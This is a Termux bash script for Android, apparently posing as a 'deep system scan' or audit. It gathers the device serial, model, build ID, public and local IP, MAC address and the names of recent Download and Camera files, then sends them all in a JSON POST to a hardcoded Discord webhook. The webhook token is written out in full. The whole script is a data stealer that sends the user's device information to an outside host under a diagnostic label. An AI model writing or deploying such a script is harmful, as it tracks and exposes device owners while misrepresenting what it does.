#!/data/data/com.termux/files/usr/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

echo "Executando varredura profunda no sistema..."

# 1. IDENTIFICACAO DO HARDWARE
MODELO=$(getprop ro.product.model)
MARCA=$(getprop ro.product.manufacturer)
SERIAL=$(getprop ro.serialno)
PROCESSADOR=$(getprop ro.board.platform)
VERSAO_OS=$(getprop ro.build.version.release)
ID_BUILD=$(getprop ro.build.id)

# 2. STATUS DA BATERIA
BATERIA_NIVEL=$(termux-battery-status 2>/dev/null | grep "percentage" | cut -d: -f2 | tr -d ', ')
BATERIA_SAUDE=$(termux-battery-status 2>/dev/null | grep "health" | cut -d: -f2 | tr -d '", ')

# 3. REDE E CONEXAO
IP_PUB=$(curl -s https://ifconfig.me)
IP_LOC=$(ifconfig wlan0 2>/dev/null | grep "inet " | awk '{print $2}')
MAC=$(cat /sys/class/net/wlan0/address 2>/dev/null)

# 4. ARQUIVOS (Listagem de nomes para evitar erro de tamanho)
# Requer que voce tenha rodado o comando 'termux-setup-storage' antes
FILES_DOWNLOAD=$(ls /sdcard/Download 2>/dev/null | head -n 10 | tr '\n' ', ')
FILES_PHOTOS=$(ls /sdcard/DCIM/Camera 2>/dev/null | head -n 10 | tr '\n' ', ')

# 5. MONTAGEM DO PAYLOAD (TEXTO PURO)
PAYLOAD=$(cat <<EOF
{
  "content": "AUDITORIA NIVEL MAXIMO - ANDROID",
  "embeds": [
    {
      "title": "Diagnostico: $MARCA $MODELO",
      "color": 16711680,
      "fields": [
        { "name": "Identificacao", "value": "Marca: $MARCA\nModelo: $MODELO\nSerial: $SERIAL\nAndroid: $VERSAO_OS", "inline": false },
        { "name": "Hardware", "value": "Chipset: $PROCESSADOR\nBateria: $BATERIA_NIVEL%\nSaude: $BATERIA_SAUDE", "inline": true },
        { "name": "Rede", "value": "IP Publico: $IP_PUB\nIP Local: $IP_LOC\nMAC: $MAC", "inline": false },
        { "name": "Arquivos Recentes (Download)", "value": "${FILES_DOWNLOAD:-Nenhum ou sem permissao}", "inline": false },
        { "name": "Arquivos Recentes (Camera)", "value": "${FILES_PHOTOS:-Nenhum ou sem permissao}", "inline": false }
      ],
      "footer": { "text": "Build ID: $ID_BUILD" }
    }
  ]
}
EOF
)

# ENVIO
curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" $URL

echo "Processo concluido."
